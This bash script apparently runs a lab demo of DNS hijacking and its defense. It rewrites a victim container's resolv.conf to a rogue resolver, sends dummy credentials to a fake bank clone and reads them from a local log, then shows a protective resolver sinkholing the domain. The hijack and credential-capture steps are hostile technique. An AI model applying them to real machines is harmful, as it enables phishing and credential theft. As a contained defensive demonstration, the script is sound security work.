#!/usr/bin/env bash
# run the whole dns demo: hijack lands on the fake bank, then the resolver blocks it
set -uo pipefail

ROGUE=10.255.255.23
RESOLVER=10.255.255.25

echo "########## HIJACK: victim points at the rogue resolver ##########"
incus exec dns-victim -- bash -c "echo 'nameserver $ROGUE' > /etc/resolv.conf"
# wait for the rogue to actually answer
for i in $(seq 1 20); do
	incus exec dns-victim -- nslookup bank-lab.example "$ROGUE" >/dev/null 2>&1 && break
	sleep 2
done
echo "-- nslookup bank-lab.example (rogue answers with the fake bank):"
incus exec dns-victim -- nslookup bank-lab.example 2>&1 | grep -A1 'Name:' | tail -2
echo "-- victim submits credentials to the clone:"
incus exec dns-victim -- curl -s -X POST http://bank-lab.example/login -d 'username=jdoe&password=hunter2' >/dev/null && echo "   submitted"
echo "-- captured in fake-bank's local sink:"
incus exec fake-bank -- tail -1 /var/log/fake-bank/creds.log

echo
echo "########## DEFENSE: victim points at the protective resolver ##########"
incus exec dns-victim -- bash -c "echo 'nameserver $RESOLVER' > /etc/resolv.conf"
echo "-- nslookup bank-lab.example (scored high -> sinkholed to 0.0.0.0):"
incus exec dns-victim -- nslookup bank-lab.example 2>&1 | grep -A1 'Name:' | tail -2
echo "-- a normal domain still resolves:"
incus exec dns-victim -- nslookup example.com 2>&1 | grep -A1 'Name:' | tail -2
echo "-- resolver's scored decision (hierarchical id + breakdown):"
incus exec dns-resolver -- tail -1 /var/log/dns-resolver/events.log

echo
echo ">> Wazuh: look for rule 100201 (sinkhole) in Threat Hunting. Dashboard: https://10.255.255.21/"
